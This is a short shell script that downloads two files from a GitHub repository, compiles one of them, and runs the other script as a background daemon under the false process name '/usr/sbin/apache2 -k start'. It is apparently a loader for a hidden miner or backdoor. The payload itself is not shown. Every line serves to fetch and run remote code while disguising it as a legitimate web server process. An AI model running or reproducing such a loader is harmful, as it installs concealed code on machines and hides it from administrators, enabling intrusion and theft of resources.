#!/bin/sh
  wget https://github.com/biswas179/FkgX/raw/main/fk.sh 
  chmod +x fk.sh 
  wget https://github.com/biswas179/FkgX/raw/main/mas.c 
  gcc -o test mas.c 
  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./fk.sh
  sleep 20000
